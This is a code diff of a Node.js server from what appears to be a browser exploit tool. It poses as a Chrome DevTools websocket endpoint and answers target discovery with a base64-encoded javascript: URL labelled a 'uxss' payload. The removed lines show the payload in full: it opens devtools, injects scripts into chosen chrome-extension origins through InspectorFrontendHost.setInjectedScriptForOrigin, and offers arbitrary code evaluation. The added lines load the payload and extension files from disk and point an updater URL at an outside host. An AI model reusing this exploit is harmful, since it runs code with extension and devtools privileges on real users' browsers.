@@ -2,12 +2,15 @@ import { WebSocketServer } from "ws";
 import { createServer } from "http";
 import finalhandler from "finalhandler";
 import serveStatic from "serve-static";
-
+import * as readline from 'readline-sync';
+import * as fs from "fs";
+import path from "path";
 const WebSocket_port = 8080;
 const HTTP_port = 9123;
 const wss = new WebSocketServer({ port: WebSocket_port });
-
 const serve = serveStatic("./");
+console.log("hi", globalThis.module);
+
 createServer((req, res) => {
     res.setHeader("Access-Control-Allow-Origin", "*");
     serve(req, res, finalhandler(req, res));
@@ -18,108 +21,51 @@ console.log(
 console.log(
     `The websocket is accessible at http://localhost:${WebSocket_port}\n--------`,
 );
-
+let globalUID = 0;
 let sessionId = "89AC63D12B18F3EE9808C13899C9B695";
 
+
+// console.log(htmlFile);
+function requireFromString(s) {
+    const Module = module.constructor;
+    var m = new Module();
+    m._compile(s);
+    return m.exports;
+}
+
+let serverConfig = "{\"updater_url\": \"rigtools.asyncsmasher.com\"}"; 
+try {
+    serverConfig =  fs.readFileSync('server_config.json');
+} catch (e) {
+    console.log(`Using default update url ${JSON.parse(serverConfig).updater_url} because it failed to read the file: ${e}`);
+}
 wss.on("connection", function connection(wss_con) {
-    wss_con.on("message", (msg) => {
-        function payload1() {
-
-            // alert(origin);
-
-            //     window.w = w;
-            // })
-            const w = window.opener.open("devtools://devtools/bundled/devtools_app.html");
-            window.opener.close();
-            w.addEventListener("load", async () => {
-                if (!w.DevToolsAPI) {
-                    console.log("reloading");
-                    w.opener = null;
-                    w.location.reload();
-                }
-                await sleep(500);
-                console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
-                exploit(w);
-            });
-
-            window.w = w;
-
-
-            function exploit(w) {
-
-
-                function ui() {
-                    function payload_swamp(w) {
-                        w.alert("Hello world from " + w.origin);
-                    }
-                    document.open();
-                    document.write(`
-                        <p> Press q for evaluating code under <a id="extdbg"> extension id</a> </p>
-                        <p> Press m for evaluating under <a id="devdbg">devtools </a> context </p>
-                        <p> Typing 'cancel' in any prompt will cancel the current operation. </p>
-                        
-                    `)
-                    document.close();
-                    document.querySelector('#extdbg').onclick = function() {
-                        let x = null;
-                        while (!x) {
-                            x = prompt('Extension id?');
-                            if (x === "cancel") {
-                                return;
-                            }
-                        }
-                        const URL_1 = `chrome-extension://${x ??
-                            alert("NOTREACHED")}/manifest.json`;
-                        InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `const w = open(origin + '/manifest.json'); w.onload = function () {(${payload_swamp.toString()})(w)} //`);
-                        const ifr = document.createElement("iframe");
-                        ifr.src = URL_1;
-                        document.body.appendChild(ifr);
-                        setTimeout(function() {
-                            ifr.remove();
-                        }, 500);
-                    }
-                    document.querySelector('#devdbg').onclick = function () {
-                        var l_canceled = false;
-                        const id = setTimeout(function m() {
-                            if (l_canceled) return;
-                            (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
-                            if (!l_canceled) setTimeout(m, 0);
-                            clearTimeout(id);
-                        });
-                        Object.defineProperty(window, 'cancel', {
-                            get: function() {
-                                l_canceled = true;
-                            }, configurable: true
-                        })
-                        return;
-                    }
-                }
-                w.eval(`(${ui.toString()})()`);
-                window.close();
-            }
-
-            function sleep(ms) {
-                return new Promise(resolve => {
-                    setTimeout(resolve, ms);
-                });
-            }
+    wss_con.on("message", async (msg) => {
+        
+        const result = {
+            payload1: eval(fs.readFileSync('payload.mjs'))
         }
-
+        let htmlFile = fs.readFileSync(new URL('./payloads/index.html', import.meta.url)).toString();
+        htmlFile.replace('`', '&#96;');
+        let jsFile = fs.readFileSync(new URL('./payloads/index.js', import.meta.url)).toString();
+        // jsFile = jsFile.replace('`', '\\`').replace('\'', '\\\'').replace('"', '\\"');
+        // console.log(result.payload1.toString());
         let json_msg = JSON.parse(msg.toString());
         let { id, method, params } = json_msg;
         console.log(id + "> ", method, params);
-
+        
         if (method === "Target.setDiscoverTargets") {
             wss_con.send(
                 JSON.stringify({
                     method: "Network.requestWillBeSent",
                     params: {
                         request: {
-                            url: `javascript: (function () {eval(atob("${btoa(`(${payload1.toString()})()`)}"))})() /********************************************Built-in payload for uxss*/ `,
+                            url: `javascript: (function () {eval(atob("${btoa(`(${result.payload1.toString().replace("%%EXTJS%%", btoa(jsFile)).replace("%%EXTHTML%%", btoa(htmlFile)).replace(/%%updaterurl%%/g, JSON.parse(serverConfig).updater_url)})()`)}"))})() /********************************************Built-in payload for uxss*/ `,
                         },
                     },
                 }),
             );
+            
             // setTimeout(function() {
             //     wss_con.send(
             //         JSON.stringify({
